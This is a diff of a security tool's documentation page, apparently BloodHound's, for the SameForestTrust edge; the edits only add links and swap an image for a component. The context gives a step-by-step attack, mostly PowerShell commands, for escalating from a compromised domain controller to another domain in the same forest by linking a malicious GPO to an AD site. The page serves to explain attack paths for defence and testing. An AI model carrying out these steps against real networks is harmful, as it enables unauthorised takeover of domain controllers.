@@ -3,7 +3,9 @@ title: SameForestTrust
 description: The SameForestTrust edge represents a trust relationship between two domains within the same AD forest. 
 ---
 
-<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+import ResourceEditionPill from '/snippets/resources/edition-pill.mdx';
+
+<ResourceEditionPill />
 
 In this relationship, the source node domain has a same-forest (intraforest) trust to the destination node domain, allowing principals (users and computers) from the destination domain to access resources in the source domain.
 
@@ -47,7 +49,7 @@ If ADCS is not installed: An attacker can install ADCS and exploit it, as detail
 
 ### **GPO linked on Site**
 
-AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest. An attacker with SYSTEM access to a DC can link a malicious GPO to the site of any DC in the forest.
+AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest. An attacker with SYSTEM access to a DC can link a malicious [GPO](/resources/nodes/gpo) to the site of any DC in the forest.
 
 **Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain**
 Use PsExec to start a PowerShell terminal as SYSTEM on the DC:
@@ -56,14 +58,14 @@ Use PsExec to start a PowerShell terminal as SYSTEM on the DC:
 PsExec64.exe -s -i -accepteula powershell
 ```
 
-**Step 2: Create a GPO**
-Use the GroupPolicy module of RSAT to create the new GPO:
+**Step 2: Create a [GPO](/resources/nodes/gpo)**
+Use the GroupPolicy module of RSAT to create the new [GPO](/resources/nodes/gpo):
 
 ```powershell
 New-GPO -Name "MyGPO"
 ```
 
-**Step 3: Add the compromising setting to the GPO**
+**Step 3: Add the compromising setting to the [GPO](/resources/nodes/gpo)**
 Use SharpGPOAbuse to add a scheduled task:
 
 ```powershell
@@ -83,9 +85,9 @@ Look up the site DistinguishedName:
 Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName
 ```
 
-**Step 5: Set the GPO permissions**
+**Step 5: Set the [GPO](/resources/nodes/gpo) permissions**
 
-This step is important to avoid applying the GPO to all computers connected to the site. Use the GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object but only the targeted computer applies the GPO settings:
+This step is important to avoid applying the [GPO](/resources/nodes/gpo) to all computers connected to the site. Use the GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object but only the targeted computer applies the GPO settings:
 
 ```powershell
 $GPO = Get-GPO -Name "MyGPO"
@@ -93,16 +95,16 @@ $GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName "Authenticated Use
 $GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName "BASTION\\bldc01" -TargetType Computer
 ```
 
-**Step 6: Link the GPO to the site**
-Use the GroupPolicy module of RSAT to link the GPO to the site:
+**Step 6: Link the [GPO](/resources/nodes/gpo) to the site**
+Use the GroupPolicy module of RSAT to link the [GPO](/resources/nodes/gpo) to the site:
 
 ```powershell
 New-GPLink -Name "MyGPO" -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local" -Server dc01.dumpster.fire
 ```
 
-Note that you must specify the server to be the DC where you are running the command, as the command defaults to execute the change on a root domain DC where the compromised DC does not have the permissions to link the GPO.
+Note that you must specify the server to be the DC where you are running the command, as the command defaults to execute the change on a root domain DC where the compromised DC does not have the permissions to link the [GPO](/resources/nodes/gpo).
 
-Wait until replication has happened and the GPO has applied on the target DC, and log in with Administrators access on the compromised DC. Replication within the same site happens within 15 seconds but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by default.
+Wait until replication has happened and the [GPO](/resources/nodes/gpo) has applied on the target DC, and log in with Administrators access on the compromised DC. Replication within the same site happens within 15 seconds but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by default.
 
 ## Opsec Considerations
 
